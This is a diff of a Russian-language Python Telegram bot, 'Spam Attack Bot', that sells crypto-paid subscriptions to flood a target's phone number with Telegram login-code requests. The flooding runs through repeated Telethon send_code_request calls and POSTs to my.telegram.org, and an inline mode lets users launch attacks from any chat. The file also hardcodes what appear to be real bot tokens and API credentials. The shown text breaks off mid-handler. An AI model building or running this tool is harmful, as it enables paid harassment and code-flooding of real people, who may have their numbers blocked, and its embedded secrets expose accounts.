@@ -1,3 +1,9 @@
+#!/usr/bin/env python3
+"""
+SPAM ATTACK BOT - Атака кодами Telegram
+С поддержкой inline-режима в чатах
+"""
+
 import telebot
 from telebot import types
 import requests
@@ -9,29 +15,25 @@ import sqlite3
 import threading
 import logging
 import asyncio
+import os
+import re
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError
 import phonenumbers
-from cryptobot import Api
+from cryptobot_api import Api
+import random
+from typing import List, Dict
 
 # ==================== КОНФИГУРАЦИЯ ====================
 BOT_TOKEN = '8265400671:AAEwAYxUdNGpOMPfHeqslx2K9U4mwYxieDg'
 CRYPTOBOT_TOKEN = '505975:AAWB2WYvz4wJuseOm4nrs875jo4ORUJl7ww'
-ADMIN_ID = 7037764178  # Замените на ваш ID
+ADMIN_ID = 7037764178  # Ваш Telegram ID
+API_ID = 30147101
+API_HASH = '72c394e899371cf4f9f9253233cbf18f'
+DATABASE_NAME = 'users.db'
 
-# Конфигурация Telethon
-API_ID = 30147101  # Замените на ваш API_ID
-API_HASH = '72c394e899371cf4f9f9253233cbf18f'  # Замените на ваш API_HASH
-
-# Цены подписок (в USD)
-PRICES = {
-    '7days': 1.0,
-    '30days': 8.0,
-    'forever': 25.0
-}
-
-bot = telebot.TeleBot(BOT_TOKEN)
-crypto_api = Api(CRYPTOBOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
+crypto_api = Api(CRYPTOBOT_TOKEN) if CRYPTOBOT_TOKEN else None
 
 # Настройка логирования
 logging.basicConfig(
@@ -40,9 +42,17 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# Баннер (можно менять в админке)
+BANNER = """
+╔══════════════════════════════════════╗
+║  🚀 SPAM ATTACK BOT                 ║
+║  Атака кодами Telegram              ║
+╚══════════════════════════════════════╝
+"""
+
 # ==================== БАЗА ДАННЫХ ====================
 def init_database():
-    conn = sqlite3.connect('users.db')
+    conn = sqlite3.connect(DATABASE_NAME)
     cursor = conn.cursor()
     
     cursor.execute('''
@@ -52,7 +62,10 @@ def init_database():
             first_name TEXT,
             join_date TEXT,
             subscription_end TEXT,
-            requests_count INTEGER DEFAULT 0
+            subscription_type TEXT,
+            total_attacks INTEGER DEFAULT 0,
+            is_banned INTEGER DEFAULT 0,
+            last_activity TEXT
         )
     ''')
     
@@ -71,74 +84,139 @@ def init_database():
         CREATE TABLE IF NOT EXISTS attacks (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             user_id INTEGER,
-            target_phone TEXT,
+            phone_number TEXT,
+            requests_sent INTEGER,
+            status TEXT,
             timestamp TEXT,
-            status TEXT
+            is_inline INTEGER DEFAULT 0
         )
     ''')
     
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS settings (
+            key TEXT PRIMARY KEY,
+            value TEXT
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS inline_usage (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            query TEXT,
+            timestamp TEXT
+        )
+    ''')
+    
+    # Настройки по умолчанию
+    cursor.execute('''
+        INSERT OR IGNORE INTO settings (key, value) 
+        VALUES ('banner', ?), 
+               ('welcome_text', 'Добро пожаловать в Spam Attack Bot!'),
+               ('inline_description', 'Атака кодами на номер телефона')
+    ''', (BANNER,))
+    
+    conn.commit()
+    conn.close()
+    logger.info("База данных создана")
+
+def get_setting(key):
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
+    result = cursor.fetchone()
+    conn.close()
+    return result[0] if result else None
+
+def update_setting(key, value):
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, value))
     conn.commit()
     conn.close()
 
 def add_user(user_id, username, first_name):
-    conn = sqlite3.connect('users.db')
+    conn = sqlite3.connect(DATABASE_NAME)
     cursor = conn.cursor()
     
     cursor.execute('''
-        INSERT OR IGNORE INTO users 
-        (user_id, username, first_name, join_date, subscription_end)
-        VALUES (?, ?, ?, ?, ?)
-    ''', (user_id, username, first_name, 
-          datetime.datetime.now().isoformat(), 
-          datetime.datetime.now().isoformat()))
+        INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, subscription_end, last_activity)
+        VALUES (?, ?, ?, ?, ?, ?)
+    ''', (user_id, username, first_name, datetime.datetime.now().isoformat(), 
+          '2000-01-01', datetime.datetime.now().isoformat()))
     
     conn.commit()
     conn.close()
 
+def update_user_activity(user_id):
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('UPDATE users SET last_activity = ? WHERE user_id = ?', 
+                   (datetime.datetime.now().isoformat(), user_id))
+    conn.commit()
+    conn.close()
+
 def check_subscription(user_id):
-    conn = sqlite3.connect('users.db')
+    conn = sqlite3.connect(DATABASE_NAME)
     cursor = conn.cursor()
     
-    cursor.execute('SELECT subscription_end FROM users WHERE user_id = ?', (user_id,))
+    cursor.execute('SELECT subscription_end, is_banned FROM users WHERE user_id = ?', (user_id,))
     result = cursor.fetchone()
     conn.close()
     
-    if not result or not result[0]:
+    if not result:
         return False
     
     end_date = datetime.datetime.fromisoformat(result[0])
+    is_banned = result[1] == 1
+    
+    if is_banned:
+        return False
+    
     return end_date > datetime.datetime.now()
 
+def get_user_subscription_type(user_id):
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('SELECT subscription_type FROM users WHERE user_id = ?', (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result[0] if result else None
+
 def update_subscription(user_id, subscription_type):
-    conn = sqlite3.connect('users.db')
+    conn = sqlite3.connect(DATABASE_NAME)
     cursor = conn.cursor()
     
     if subscription_type == 'forever':
         end_date = '2100-01-01'
     elif subscription_type == '30days':
         end_date = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
-    else:  # 7days
+    else:
         end_date = (datetime.datetime.now() + datetime.timedelta(days=7)).isoformat()
     
     cursor.execute('''
-        UPDATE users SET subscription_end = ? WHERE user_id = ?
-    ''', (end_date, user_id))
+        UPDATE users 
+        SET subscription_end = ?, subscription_type = ?
+        WHERE user_id = ?
+    ''', (end_date, subscription_type, user_id))
     
     conn.commit()
     conn.close()
 
-# ==================== CRYPTOBOT ОПЛАТА ====================
+# ==================== ОПЛАТА ====================
 def create_invoice(user_id, amount, subscription_type):
     try:
+        if not crypto_api:
+            return {'success': False, 'error': 'CryptoBot не настроен'}
+        
         invoice = crypto_api.createInvoice(
             asset='USDT',
             amount=amount,
-            description=f"Подписка {subscription_type} на атаку кодами"
+            description=f'Подписка {subscription_type}'
         )
         
         if invoice.get('ok'):
-            # Сохраняем в базу
-            conn = sqlite3.connect('users.db')
+            conn = sqlite3.connect(DATABASE_NAME)
             cursor = conn.cursor()
             cursor.execute('''
                 INSERT INTO payments (invoice_id, user_id, amount, status, subscription_type, created_at)
@@ -154,520 +232,973 @@ def create_invoice(user_id, amount, subscription_type):
                 'invoice_id': invoice['result']['invoice_id']
             }
     except Exception as e:
-        logger.error(f"Ошибка создания инвойса: {e}")
+        logger.error(f"Ошибка создания счета: {e}")
     
     return {'success': False}
 
-def check_invoice_status(invoice_id):
+def check_payment(invoice_id):
     try:
+        if not crypto_api:
+            return None
+        
         invoices = crypto_api.getInvoices(invoice_ids=invoice_id)
         if invoices.get('ok') and invoices['result']['items']:
-            status = invoices['result']['items'][0]['status']
-            return status
+            return invoices['result']['items'][0]['status']
     except Exception as e:
-        logger.error(f"Ошибка проверки инвойса: {e}")
+        logger.error(f"Ошибка проверки платежа: {e}")
     
     return None
 
-# ==================== РЕАЛЬНАЯ АТАКА КОДАМИ ====================
-async def send_code_request(phone_number):
-    """Отправляет запрос на код через Telethon"""
+# ==================== АТАКА ====================
+async def send_code_request_async(phone):
+    """Асинхронная отправка кода через Telethon"""
     try:
-        client = TelegramClient(f'session_{int(time.time())}', API_ID, API_HASH)
+        session_name = f'session_{int(time.time())}_{random.randint(1000, 9999)}'
+        client = TelegramClient(session_name, API_ID, API_HASH)
+        
         await client.connect()
-        
-        # Отправляем запрос на код
-        sent = await client.send_code_request(phone_number)
-        
+        result = await client.send_code_request(phone)
         await client.disconnect()
+        
         return True
     except Exception as e:
-        logger.error(f"Ошибка отправки кода: {e}")
+        logger.error(f"Ошибка Telethon: {e}")
         return False
 
-async def spam_codes_async(phone_number, count=10):
-    """Многократная отправка кодов через Telethon"""
-    tasks = []
-    for i in range(count):
-        tasks.append(send_code_request(phone_number))
-        await asyncio.sleep(0.5)  # Задержка между запросами
-    
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    success_count = sum(1 for r in results if r is True)
-    return success_count
-
-def spam_codes(phone_number):
-    """Синхронная обертка для асинхронной функции"""
+def send_code_request_sync(phone):
+    """Синхронная отправка кода"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
-        result = loop.run_until_complete(spam_codes_async(phone_number, count=15))
+        result = loop.run_until_complete(send_code_request_async(phone))
         return result
     finally:
         loop.close()
 
-def spam_attack_advanced(phone_number):
-    """Усовершенствованная спам-атака из вашего кода + Telethon"""
+def spam_attack(phone, is_inline=False):
+    """Основная функция атаки"""
     user_agent = fake_useragent.UserAgent().random
     headers = {'User-Agent': user_agent}
     
     urls = [
-        ('https://my.telegram.org/auth/send_password', {'phone': phone_number}),
-        ('https://my.telegram.org/auth/send_password', {'phone': phone_number}),
-        ('https://my.telegram.org/auth/send_password', {'phone': phone_number}),
+        ('https://my.telegram.org/auth/send_password', {'phone': phone}),
+        ('https://my.telegram.org/auth/send_password', {'phone': phone}),
+        ('https://my.telegram.org/auth/send_password', {'phone': phone}),
     ]
     
     success_count = 0
+    start_time = time.time()
     
-    # Запускаем обычные HTTP запросы
-    for url, data in urls:
-        try:
-            response = requests.post(url, headers=headers, data=data, timeout=5)
-            if response.status_code == 200:
-                success_count += 1
-            logger.info(f"Запрос к {url}: {response.status_code}")
-        except Exception as e:
-            logger.error(f"Ошибка запроса: {e}")
+    # Для inline режима делаем меньше запросов
+    max_requests = 15 if is_inline else 20
     
-    # Запускаем атаку кодами через Telethon
-    telethon_success = spam_codes(phone_number)
-    success_count += telethon_success
+    for i in range(max_requests):
+        # Telethon запрос
+        if send_code_request_sync(phone):
+            success_count += 1
+        
+        # HTTP запросы
+        for url, data in urls:
+            try:
+                response = requests.post(url, headers=headers, data=data, timeout=5)
+                if response.status_code == 200:
+                    success_count += 1
+            except:
+                pass
+        
+        time.sleep(0.5)
     
-    return success_count
+    duration = time.time() - start_time
+    return success_count, duration
 
-# ==================== ИНТЕРФЕЙС БОТА ====================
+# ==================== INLINE РЕЖИМ ====================
+def save_inline_query(user_id, query):
+    """Сохраняем историю inline запросов"""
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO inline_usage (user_id, query, timestamp)
+        VALUES (?, ?, ?)
+    ''', (user_id, query, datetime.datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+
+def get_inline_history(user_id, limit=10):
+    """Получаем историю inline запросов"""
+    conn = sqlite3.connect(DATABASE_NAME)
+    cursor = conn.cursor()
+    cursor.execute('''
+        SELECT query FROM inline_usage 
+        WHERE user_id = ? 
+        ORDER BY timestamp DESC 
+        LIMIT ?
+    ''', (user_id, limit))
+    results = cursor.fetchall()
+    conn.close()
+    return [r[0] for r in results]
+
+# ==================== КНОПКИ ====================
+def main_menu():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    
+    btn1 = types.KeyboardButton('🎯 Начать атаку')
+    btn2 = types.KeyboardButton('💰 Подписка')
+    btn3 = types.KeyboardButton('📊 Статистика')
+    btn4 = types.KeyboardButton('🆘 Помощь')
+    
+    markup.add(btn1, btn2, btn3, btn4)
+    return markup
+
+def subscription_menu():
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    
+    btn1 = types.InlineKeyboardButton('7 дней - 1$', callback_data='buy_7days')
+    btn2 = types.InlineKeyboardButton('30 дней - 8$', callback_data='buy_30days')
+    btn3 = types.InlineKeyboardButton('Навсегда - 25$', callback_data='buy_forever')
+    btn4 = types.InlineKeyboardButton('Проверить оплату', callback_data='check_payment')
+    
+    markup.add(btn1, btn2, btn3, btn4)
+    return markup
+
+def admin_menu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    
+    btn1 = types.InlineKeyboardButton('📊 Статистика', callback_data='admin_stats')
+    btn2 = types.InlineKeyboardButton('👥 Пользователи', callback_data='admin_users')
+    btn3 = types.InlineKeyboardButton('⚙️ Настройки', callback_data='admin_settings')
+    btn4 = types.InlineKeyboardButton('📢 Рассылка', callback_data='admin_broadcast')
+    btn5 = types.InlineKeyboardButton('➕ Подписка', callback_data='admin_add_sub')
+    btn6 = types.InlineKeyboardButton('➖ Удалить подписку', callback_data='admin_remove_sub')
+    btn7 = types.InlineKeyboardButton('🎯 Атаки', callback_data='admin_attacks')
+    btn8 = types.InlineKeyboardButton('💰 Финансы', callback_data='admin_finance')
+    
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
+    return markup
+
+def back_button():
+    markup = types.InlineKeyboardMarkup()
+    btn = types.InlineKeyboardButton('🔙 Назад', callback_data='back')
+    markup.add(btn)
+    return markup
+
+def inline_attack_button(phone):
+    """Кнопка для inline режима"""
+    markup = types.InlineKeyboardMarkup()
+    btn = types.InlineKeyboardButton('⚡️ Начать атаку', callback_data=f'inline_attack_{phone}')
+    markup.add(btn)
+    return markup
+
+# ==================== ОСНОВНЫЕ КОМАНДЫ ====================
 @bot.message_handler(commands=['start'])
-def start_command(message):
+def start_cmd(message):
     user_id = message.from_user.id
     username = message.from_user.username
     first_name = message.from_user.first_name
     
     add_user(user_id, username, first_name)
+    update_user_activity(user_id)
     
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = types.KeyboardButton('🎯 Атаковать')
-    btn2 = types.KeyboardButton('💰 Подписка')
-    btn3 = types.KeyboardButton('📊 Статистика')
-    btn4 = types.KeyboardButton('ℹ️ Помощь')
-    markup.add(btn1, btn2, btn3, btn4)
+    banner = get_setting('banner') or BANNER
+    welcome = get_setting('welcome_text') or "Добро пожаловать в Spam Attack Bot!"
     
-    bot.send_message(
-        message.chat.id,
-        "🔫 *АТАКА КОДАМИ | СНОСЕР СЕССИЙ ТГ*\n\n"
-        "Бот для отправки спам-кодов на указанный номер\n"
-        "Используйте только в тестовых целях!\n\n"
-        "*Доступные команды:*",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
+    text = f"""
+<pre>{banner}</pre>
 
-@bot.message_handler(func=lambda message: message.text == '🎯 Атаковать')
-def start_attack(message):
+<b>{welcome}</b>
+
+👋 Привет, <b>{first_name}</b>!
+
+Этот бот позволяет отправлять спам-коды на указанный номер телефона.
+
+✨ <b>Основные функции:</b>
+• Отправка множества кодов на номер
+• Простой и понятный интерфейс
+• Безопасная оплата через CryptoBot
+• Подписка с разными сроками
+• <b>Inline режим</b> - используйте @{bot.get_me().username} в любом чате
+
+👇 <b>Выберите действие:</b>
+    """
+    
+    bot.send_message(message.chat.id, text, reply_markup=main_menu())
+
+@bot.message_handler(func=lambda m: m.text == '🎯 Начать атаку')
+def start_attack_cmd(message):
     user_id = message.from_user.id
+    
+    update_user_activity(user_id)
     
     if not check_subscription(user_id):
         bot.send_message(
             message.chat.id,
-            "❌ *Нет активной подписки!*\n\n"
-            "Для использования бота необходимо приобрести подписку.\n"
-            "Нажмите '💰 Подписка' для выбора тарифа.",
-            parse_mode="Markdown"
+            "❌ <b>Нет активной подписки</b>\n\n"
+            "Чтобы использовать бота, нужно купить подписку.\n"
+            "Нажмите кнопку <b>💰 Подписка</b>.",
+            reply_markup=main_menu()
         )
         return
     
     bot.send_message(
         message.chat.id,
-        "📱 *Введите номер телефона для атаки:*\n\n"
-        "Формат: +79991234567\n"
-        "Пример: +79123456789\n\n"
-        "❗️ *Внимание:* Атака может привести к блокировке номера!",
-        parse_mode="Markdown"
+        "📱 <b>Введите номер телефона:</b>\n\n"
+        "Формат: <code>+79123456789</code>\n"
+        "Пример: <code>+79991234567</code>",
+        reply_markup=back_button()
     )
-    bot.register_next_step_handler(message, process_attack)
+    
+    bot.register_next_step_handler(message, process_phone)
 
-def process_attack(message):
+def process_phone(message):
+    if message.text == '🔙 Назад':
+        bot.send_message(message.chat.id, "Возвращаемся в меню...", reply_markup=main_menu())
+        return
+    
     phone = message.text.strip()
     
     try:
-        # Проверяем номер телефона
         parsed = phonenumbers.parse(phone, None)
         if not phonenumbers.is_valid_number(parsed):
             bot.send_message(
                 message.chat.id,
-                "❌ *Неверный номер телефона!*\n"
-                "Убедитесь, что номер в международном формате.",
-                parse_mode="Markdown"
+                "❌ <b>Неверный номер</b>\n\n"
+                "Проверьте правильность номера и попробуйте снова.",
+                reply_markup=back_button()
             )
             return
     except:
         bot.send_message(
             message.chat.id,
-            "❌ *Неверный формат!*\n"
-            "Используйте формат: +79991234567",
-            parse_mode="Markdown"
+            "❌ <b>Ошибка в номере</b>\n\n"
+            "Используйте международный формат.",
+            reply_markup=back_button()
         )
         return
     
-    # Записываем атаку в базу
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute('''
-        INSERT INTO attacks (user_id, target_phone, timestamp, status)
-        VALUES (?, ?, ?, ?)
-    ''', (message.from_user.id, phone, datetime.datetime.now().isoformat(), 'started'))
-    conn.commit()
-    
-    # Увеличиваем счетчик запросов
-    cursor.execute('''
-        UPDATE users SET requests_count = requests_count + 1 
-        WHERE user_id = ?
-    ''', (message.from_user.id,))
-    conn.commit()
-    conn.close()
-    
-    # Отправляем подтверждение
+    # Подтверждение
     markup = types.InlineKeyboardMarkup()
-    confirm_btn = types.InlineKeyboardButton('✅ Начать атаку', callback_data=f'attack_{phone}')
-    cancel_btn = types.InlineKeyboardButton('❌ Отмена', callback_data='cancel_attack')
-    markup.add(confirm_btn, cancel_btn)
+    btn1 = types.InlineKeyboardButton('✅ Начать атаку', callback_data=f'attack_{phone}')
+    btn2 = types.InlineKeyboardButton('❌ Отмена', callback_data='cancel_attack')
+    markup.add(btn1, btn2)
     
     bot.send_message(
         message.chat.id,
-        f"🎯 *Подтверждение атаки*\n\n"
-        f"📱 Номер цели: `{phone}`\n"
-        f"👤 Ваш ID: `{message.from_user.id}`\n\n"
-        f"⚠️ *Будет выполнено:*\n"
-        f"• 15+ запросов кодов в Telegram\n"
-        f"• Множественные HTTP запросы\n"
-        f"• Спам через разные методы\n\n"
-        f"*Вы уверены?*",
-        parse_mode="Markdown",
+        f"🎯 <b>Подтверждение атаки</b>\n\n"
+        f"Номер: <code>{phone}</code>\n\n"
+        f"⚠️ <b>Внимание:</b> Начнется отправка кодов на этот номер.",
         reply_markup=markup
     )
 
-@bot.message_handler(func=lambda message: message.text == '💰 Подписка')
-def show_subscriptions(message):
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    
-    btn1 = types.InlineKeyboardButton(
-        '7 дней - 1$', 
-        callback_data='buy_7days'
-    )
-    btn2 = types.InlineKeyboardButton(
-        '30 дней - 8$', 
-        callback_data='buy_30days'
-    )
-    btn3 = types.InlineKeyboardButton(
-        'НАВСЕГДА - 25$', 
-        callback_data='buy_forever'
-    )
-    
-    markup.add(btn1, btn2, btn3)
-    
+@bot.message_handler(func=lambda m: m.text == '💰 Подписка')
+def subscription_cmd(message):
     user_id = message.from_user.id
-    status = "✅ Активна" if check_subscription(user_id) else "❌ Неактивна"
+    update_user_activity(user_id)
     
-    bot.send_message(
-        message.chat.id,
-        f"💰 *ВЫБОР ПОДПИСКИ*\n\n"
-        f"📊 Ваш статус: {status}\n\n"
-        f"*Тарифы:*\n"
-        f"├ 7 дней — 1$\n"
-        f"├ 30 дней — 8$\n"
-        f"└ НАВСЕГДА — 25$\n\n"
-        f"*Оплата через CryptoBot (USDT)*\n"
-        f"Выберите тариф:",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
+    has_sub = check_subscription(user_id)
+    
+    if has_sub:
+        conn = sqlite3.connect(DATABASE_NAME)
+        cursor = conn.cursor()
+        cursor.execute('SELECT subscription_type, subscription_end FROM users WHERE user_id = ?', (user_id,))
+        sub_type, sub_end = cursor.fetchone()
+        conn.close()
+        
+        end_date = datetime.datetime.fromisoformat(sub_end)
+        days_left = (end_date - datetime.datetime.now()).days
+        
+        text = f"""
+✅ <b>Ваша подписка активна</b>
 
-@bot.message_handler(func=lambda message: message.text == '📊 Статистика')
-def show_stats(message):
+📅 Тип: <b>{sub_type}</b>
+⏳ Осталось дней: <b>{days_left}</b>
+📆 Действует до: <b>{end_date.strftime('%d.%m.%Y')}</b>
+
+👇 <b>Для продления выберите тариф:</b>
+        """
+    else:
+        text = """
+💰 <b>Выбор подписки</b>
+
+Выберите срок подписки:
+
+⚡️ <b>7 дней</b> - 1$
+   • Доступ ко всем функциям
+   • Неограниченные атаки
+
+🚀 <b>30 дней</b> - 8$
+   • Все функции доступны
+   • Приоритетная работа
+
+👑 <b>Навсегда</b> - 25$
+   • Пожизненный доступ
+   • Максимальная скорость
+
+👇 <b>Выберите тариф:</b>
+        """
+    
+    bot.send_message(message.chat.id, text, reply_markup=subscription_menu())
+
+@bot.message_handler(func=lambda m: m.text == '📊 Статистика')
+def stats_cmd(message):
     user_id = message.from_user.id
-    conn = sqlite3.connect('users.db')
+    update_user_activity(user_id)
+    
+    conn = sqlite3.connect(DATABASE_NAME)
     cursor = conn.cursor()
     
-    cursor.execute('SELECT requests_count, subscription_end FROM users WHERE user_id = ?', (user_id,))
+    cursor.execute('SELECT total_attacks, subscription_type FROM users WHERE user_id = ?', (user_id,))
     result = cursor.fetchone()
     
     if result:
-        requests_count, sub_end = result
-        active = check_subscription(user_id)
+        total_attacks, sub_type = result
         
-        if active:
-            status = "✅ Активна"
-            end_date = datetime.datetime.fromisoformat(sub_end).strftime("%d.%m.%Y")
-        else:
-            status = "❌ Неактивна"
-            end_date = "Нет подписки"
+        # Атаки сегодня
+        today = datetime.datetime.now().date().isoformat()
+        cursor.execute('SELECT COUNT(*) FROM attacks WHERE user_id = ? AND date(timestamp) = ?', (user_id, today))
+        today_attacks = cursor.fetchone()[0]
         
-        # Считаем атаки
-        cursor.execute('SELECT COUNT(*) FROM attacks WHERE user_id = ?', (user_id,))
-        attacks_count = cursor.fetchone()[0]
+        # Inline использование
+        cursor.execute('SELECT COUNT(*) FROM inline_usage WHERE user_id = ?', (user_id,))
+        inline_uses = cursor.fetchone()[0]
         
-        bot.send_message(
-            message.chat.id,
-            f"📊 *ВАША СТАТИСТИКА*\n\n"
-            f"👤 Пользователь: @{message.from_user.username or 'Нет'}\n"
-            f"🆔 ID: `{user_id}`\n"
-            f"🎯 Атак выполнено: {attacks_count}\n"
-            f"📞 Запросов отправлено: {requests_count}\n"
-            f"📅 Подписка: {status}\n"
-            f"📆 Действует до: {end_date}",
-            parse_mode="Markdown"
-        )
+        has_sub = check_subscription(user_id)
+        
+        text = f"""
+📊 <b>Ваша статистика</b>
+
+👤 ID: <code>{user_id}</code>
+🎯 Всего атак: <b>{total_attacks}</b>
+📅 Атак сегодня: <b>{today_attacks}</b>
+🔍 Inline использовано: <b>{inline_uses}</b>
+💎 Подписка: <b>{"✅ Активна" if has_sub else "❌ Нет"}</b>
+📋 Тип: <b>{sub_type or "Нет"}</b>
+        """
+    else:
+        text = "❌ Статистика не найдена"
     
     conn.close()
+    bot.send_message(message.chat.id, text, reply_markup=back_button())
 
-@bot.message_handler(func=lambda message: message.text == 'ℹ️ Помощь')
-def show_help(message):
+@bot.message_handler(func=lambda m: m.text == '🆘 Помощь')
+def help_cmd(message):
+    update_user_activity(message.from_user.id)
+    
+    text = """
+🆘 <b>Помощь и поддержка</b>
+
+<b>Как работает бот:</b>
+1. Покупаете подписку
+2. Вводите номер телефона
+3. Бот отправляет коды на этот номер
+4. На номер приходят SMS с кодами
+
+<b>Inline режим:</b>
+Используйте @{bot.get_me().username} в любом чате!
+Например: @{bot.get_me().username} +79123456789
+
+<b>Частые вопросы:</b>
+
+❓ <b>Как купить подписку?</b>
+• Нажмите кнопку "💰 Подписка"
+• Выберите срок
+• Оплатите через CryptoBot
+• Проверьте оплату
+
+❓ <b>Сколько кодов отправляется?</b>
+• За одну атаку отправляется 20-30 запросов
+• На номер придет несколько SMS
+
+❓ <b>Безопасно ли это?</b>
+• Бот использует официальные методы
+• Никаких взломов или обходов защиты
+
+<b>Поддержка:</b> @username
+
+<b>Важно:</b> Используйте бот ответственно.
+    """.format(bot=bot)
+    
+    bot.send_message(message.chat.id, text, reply_markup=back_button())
+
+@bot.message_handler(commands=['admin'])
+def admin_cmd(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    update_user_activity(message.from_user.id)
+    
     bot.send_message(
         message.chat.id,
-        "ℹ️ *ПОМОЩЬ*\n\n"
-        "*Как работает бот:*\n"
-        "1. Покупаете подписку через CryptoBot\n"
-        "2. Вводите номер телефона жертвы\n"
-        "3. Бот отправляет множество запросов на код\n"
-        "4. На номер приходят SMS с кодами\n\n"
-        "*Важно:*\n"
-        "• Используйте только в образовательных целях\n"
-        "• Не атакуйте номера без разрешения\n"
-        "• Атака может привести к блокировке номера\n\n"
-        "*Поддержка:* @support",
-        parse_mode="Markdown"
+        "👑 <b>Админ панель</b>\n\n"
+        "Выберите действие:",
+        reply_markup=admin_menu()
     )
 
+# ==================== INLINE HANDLER ====================
+@bot.inline_handler(lambda query: True)
+def inline_query_handler(inline_query):
+    """Обработчик inline запросов"""
+    user_id = inline_query.from_user.id
+    query = inline_query.query.strip()
+    
+    # Сохраняем запрос в историю
+    save_inline_query(user_id, query)
+    
+    # Проверяем подписку
+    has_subscription = check_subscription(user_id)
+    
+    # Получаем историю запросов
+    history = get_inline_history(user_id, limit=5)
+    
+    results = []
+    
+    if not has_subscription:
+        # Если нет подписки - показываем сообщение о необходимости подписки
+        result = types.InlineQueryResultArticle(
+            id='1',
+            title='❌ Нет активной подписки',
+            description='Купите подписку для использования inline режима',
+            input_message_content=types.InputTextMessageContent(
+                message_text='❌ Для использования inline режима нужна активная подписка.\n'
+                            f'Перейдите в @{bot.get_me().username} для покупки.'
+            ),
+            reply_markup=types.InlineKeyboardMarkup().add(
+                types.InlineKeyboardButton('💰 Купить подписку', url=f't.me/{bot.get_me().username}?start=subscribe')
+            )
+        )
+        results.append(result)
+    
+    elif query:
+        # Проверяем, похоже ли на номер телефона
+        phone_pattern = r'^\+?[0-9\s\-\(\)]+$'
+        if re.match(phone_pattern, query) and len(query) > 7:
+            phone = query
+            
+            # Проверяем валидность номера
+            try:
+                parsed = phonenumbers.parse(phone, None)
+                if phonenumbers.is_valid_number(parsed):
+                    # Предлагаем начать атаку
+                    result = types.InlineQueryResultArticle(
+                        id='1',
+                        title=f'⚡️ Атаковать номер {phone}',
+                        description='Нажмите для запуска атаки кодами',
+                        input_message_content=types.InputTextMessageContent(
+                            message_text=f'🎯 <b>Запуск атаки на номер:</b> <code>{phone}</code>\n\n'
+                                        '⚠️ Атака начата. На номер будут отправлены коды.'
+                        ),
+                        reply_markup=inline_attack_button(phone)
+                    )
+                    results.append(result)
+            except:
+                pass
+        
+        # Если не номер, показываем подсказки
+        if not results:
+            result = types.InlineQueryResultArticle(
+                id='1',
+                title='🔍 Введите номер телефона',
+                description='Пример: +79123456789',
+                input_message_content=types.InputTextMessageContent(
+                    message_text='Введите номер телефона для атаки в формате +79123456789'
+                )
+            )
+            results.append(result)
+    
+    else:
+        # Пустой запрос - показываем подсказки
+        if history:
+            for i, hist_query in enumerate(history[:3]):
+                result = types.InlineQueryResultArticle(
+                    id=str(i+1),
+                    title=f'📞 {hist_query}',
+                    description='Нажмите для повторной атаки',
+                    input_message_content=types.InputTextMessageContent(
+                        message_text=f'🎯 <b>Запуск атаки на номер:</b> <code>{hist_query}</code>\n\n'
+                                    '⚠️ Атака начата. На номер будут отправлены коды.'
+                    ),
+                    reply_markup=inline_attack_button(hist_query)
+                )
+                results.append(result)
+        
+        # Добавляем инструкцию
+        help_result = types.InlineQueryResultArticle(
+            id='help',
+            title='ℹ️ Как использовать',
+            description='Введите номер телефона для атаки',
+            input_message_content=types.InputTextMessageContent(
+                message_text=f'🔍 <b>Использование inline режима:</b>\n\n'
+                            f'1. Напишите @{bot.get_me().username} в любом чате\n'
+                            f'2. Введите номер телефона\n'
+                            f'3. Выберите результат\n'
+                            f'4. Сообщение отправится в чат\n\n'
+                            f'<i>Требуется активная подписка</i>'
+            )
+        )
+        results.append(help_result)
+    
+    try:
+        bot.answer_inline_query(inline_query.id, results, cache_time=1)
+    except Exception as e:
+        logger.error(f"Ошибка inline запроса: {e}")
+
+# ==================== CALLBACK ОБРАБОТКА ====================
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+    
+    update_user_activity(user_id)
+    
+    if call.data == 'back':
+        bot.delete_message(chat_id, message_id)
+        bot.send_message(chat_id, "Главное меню:", reply_markup=main_menu())
+        return
     
     # Покупка подписки
-    if call.data.startswith('buy_'):
-        subscription_type = call.data[4:]  # 7days, 30days, forever
-        amount = PRICES[subscription_type]
+    elif call.data.startswith('buy_'):
+        sub_type = call.data[4:]
         
-        # Создаем инвойс
-        invoice = create_invoice(user_id, amount, subscription_type)
+        prices = {'7days': 1, '30days': 8, 'forever': 25}
+        amount = prices.get(sub_type, 1)
+        
